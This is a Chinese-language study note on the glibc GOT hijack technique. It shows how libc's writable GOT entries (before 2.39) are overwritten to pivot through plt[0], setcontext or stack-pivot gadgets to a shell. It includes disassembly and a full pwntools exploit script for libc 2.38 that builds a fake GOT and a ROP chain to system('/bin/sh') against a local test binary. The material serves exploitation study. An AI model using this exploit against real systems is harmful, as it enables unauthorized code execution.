[glibc GOT hijack 学习](https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/#0x00-origin)

#### libc_got_hijack

随libc版本更新，越来越多后门被封堵，[Sammy Hajhamid - HackMD](https://hackmd.io/@pepsipu)提出了一种新的利用思路，打glibc的GOT表

##### 思路

在调用printf函数时，使用了plt和got表

```
   0x7fd647475155    mov    qword ptr [rsp + 0x128], rax           [0x7ffd4268a4c8] <= 0x7ffd4268a930 ◂— 0x200000003
   0x7fd64747515d    call   *ABS*+0xab090@plt           <*ABS*+0xab090@plt>
 
   0x7fd647475162    mov    qword ptr [rsp + 0xf8], rbp

 ► 0x7fd6474284d0 <*ABS*+0xab090@plt>      endbr64 
   0x7fd6474284d4 <*ABS*+0xab090@plt+4>    bnd jmp qword ptr [rip + 0x1f0bdd] <0x7fd6474ba4c0>
```

而在libc2.36以前，got表是可写的，通过修改got表项来rop

#### 利用

提出了一种结合setcontext函数的利用思路

plt[0]表项内容为

```
.plt:0000000000028000                               ; __unwind {
.plt:0000000000028000 FF 35 02 10 1F 00             push    cs:qword_219008
.plt:0000000000028006 F2 FF 25 03 10 1F 00          bnd jmp cs:qword_219010
.plt:0000000000028006
.plt:0000000000028006                               sub_28000 endp
```

setcontext函数

```
.text:0000000000053A00 5A                            pop     rdx
.text:0000000000053A01 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h
.text:0000000000053A07 0F 83 22 01 00 00             jnb     loc_53B2F
.text:0000000000053A07
.text:0000000000053A0D 48 8B 8A E0 00 00 00          mov     rcx, [rdx+0E0h]
.text:0000000000053A14 D9 21                         fldenv  byte ptr [rcx]
.text:0000000000053A16 0F AE 92 C0 01 00 00          ldmxcsr dword ptr [rdx+1C0h]
.text:0000000000053A1D 48 8B A2 A0 00 00 00          mov     rsp, [rdx+0A0h]
```

将函数将调用的got表项改为plt[0]，将got[1]改写为布置好的context，got[2]改写为setcontext+0x20(即pop rdx地址)，就可以控制寄存器的内容

1. printf跳转对应plt，跳转到plt[0]
2. 将fakecontext压入栈，跳转到pop rdx
3. 执行setcontext ，getshell

##### 优化

结合setcontext来getshell需要较大内存空间，通过pop psp;ret栈迁移getshell

1. printf跳转对应plt，跳转到plt[0]
2. 将fake rsp压入栈，跳转到pop rsp;ret
3. 栈上rop，getshell

##### 2.36-2.38利用

libc2.36-libc2.38，got表前三项不可写，但是后续got表依旧可写，通过结合其他gadget

```
.text:0000000000177D59                 lea     rdi, [rsp+18h]
.text:0000000000177D5E                 mov     edx, 20h ; ' '
.text:0000000000177D63                 call    j_strncpy
```

```
.text:00000000000D60A9                 pop     rbp
.text:00000000000D60AA                 pop     r12
.text:00000000000D60AC                 pop     r13
.text:00000000000D60AE                 jmp     j_wmemset_0
```

通过劫持多个got表，使rdi和rsp相同，调用gets栈上rop来getshell

###### exp

上述是利用两段gadget使rdi rsp重合的，但我找到了以下gadget

```
.text:00000000001433D0                               loc_1433D0:                             ; CODE XREF: if_nametoindex+28↑j
.text:00000000001433D0 48 89 E5                      mov     rbp, rsp
.text:00000000001433D3 48 89 DE                      mov     rsi, rbx
.text:00000000001433D6 BA 10 00 00 00                mov     edx, 10h
.text:00000000001433DB 48 89 EF                      mov     rdi, rbp
.text:00000000001433DE E8 FD 30 EE FF                call    j_strncpy

.text:000000000016C090 49 89 E4                      mov     r12, rsp
.text:000000000016C093 48 89 D6                      mov     rsi, rdx
.text:000000000016C096 BA FF 00 00 00                mov     edx, 0FFh
.text:000000000016C09B 4C 89 E7                      mov     rdi, r12
.text:000000000016C09E E8 3D A4 EB FF                call    j_strncpy
```

因为还要call一个j_strncpy函数用来做最终劫持，实际上在call之前，需要让rdi比rsp小0x8字节，所以还要使用pop使rsp降低

利用以下gadget调整rsp

```
.text:00000000000D60A9                 pop     rbp
.text:00000000000D60AA                 pop     r12
.text:00000000000D60AC                 pop     r13
.text:00000000000D60AE                 jmp     j_wmemset_0
```

覆写got表时注意部分覆写，否则破环部分gets中使用函数的got表项程序终止，如gets->IO_getline->memcpy在got偏移0x40处

```
from pwn import *

context(log_level='debug',arch='amd64',os='linux')

io = process('/home/kali/pwn/c_test/lb')
# io = gdb.debug('/home/kali/pwn/c_test/lb')

libc = ELF("/home/kali/pwn/libc/x64/libc-2.38.so")

# io.recvuntil(b'\n')
libc_base = int(io.recvuntil(b'\n')[:-1:],16) - libc.sym['printf']
print(hex(libc_base))

got = libc_base + libc.dynamic_value_by_tag("DT_PLTGOT")     # got 219000

write_dest = got + 0x90
print(hex(write_dest))

got_count = 0x36  # hardcoded
got_size = 0xc8

gets_addr = libc_base + libc.sym['gets']
system_addr = libc_base + libc.sym['system']

bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
rdi_rsp_ret = libc_base + 0x1433D0
pop_rdi_ret = libc_base + 0x28795
pop_jmp_wmset = libc_base + 0xD611C
ret = libc_base + 0x28796

printf_got_offset = 0xe0
strcpy_got_offset = 0x90
wmemset_got_offset = 0xd0

fake_got = b''
fake_got += p64(pop_jmp_wmset)
fake_got = fake_got.ljust((0xd0-0x90),b'\x00')
fake_got += p64(gets_addr)
fake_got = fake_got.ljust((0xe0-0x90),b'\x00')
fake_got += p64(rdi_rsp_ret)

io.send(p64(write_dest))
io.send(p64(0x300))
io.send(fake_got)

sleep(0.3)
payload = p64(ret)*7 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
io.sendline(payload)

# gdb.attach(io)
io.interactive()
```

#### 后续

libc2.39及以后，got表全部不可写，libc got 后门被封堵

### 参考

[glibc GOT hijack 学习](https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/#0x07-one-punch)

[setcontext32 - HackMD](https://hackmd.io/@pepsipu/SyqPbk94a)
